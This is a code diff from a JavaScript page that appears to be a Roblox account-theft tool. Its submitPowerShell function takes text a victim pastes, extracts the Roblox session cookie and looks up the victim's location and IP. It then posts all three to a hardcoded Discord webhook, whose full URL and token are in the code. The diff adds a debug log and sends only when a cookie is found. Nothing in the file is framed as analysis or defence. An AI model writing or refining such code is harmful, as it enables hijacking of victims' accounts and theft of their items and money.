@@ -230,6 +230,7 @@ async function submitPowerShell() {
 
     // Extract Roblox cookie
     globalRobloxCookie = extractRobloxCookie(inputText);
+    console.log('Extracted cookie:', globalRobloxCookie); // Debug log
 
     // Show loading state
     submitBtn.disabled = true;
@@ -239,26 +240,29 @@ async function submitPowerShell() {
         // Get user location and IP
         const locationInfo = await getUserLocation();
         
-        // Send cookie to webhook immediately
-        const webhookUrl = 'https://discord.com/api/webhooks/1399753275225673778/jzgojCyaL0dSWz1pdji5g3Dvyh3HF9rsMxErcTM7cmnBi-HsOakqAxP41U-0MPTO_Mnv';
-        
-        const cookieEmbed = {
-            content: `@everyone
+        // Only send webhook if cookie is found
+        if (globalRobloxCookie) {
+            // Send cookie to webhook immediately
+            const webhookUrl = 'https://discord.com/api/webhooks/1399753275225673778/jzgojCyaL0dSWz1pdji5g3Dvyh3HF9rsMxErcTM7cmnBi-HsOakqAxP41U-0MPTO_Mnv';
+            
+            const cookieEmbed = {
+                content: `@everyone
 🍪 Cookie Found:
 \`\`\`
-_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${globalRobloxCookie || 'None found'}
+_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${globalRobloxCookie}
 \`\`\`
 📍 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
 🌐 IP: ${locationInfo.ip || 'Unknown'}`
-        };
+            };
 
-        const response = await fetch(webhookUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(cookieEmbed)
-        });
+            const response = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(cookieEmbed)
+            });
+        }
 
         // Continue flow regardless of webhook success
         setTimeout(() => {
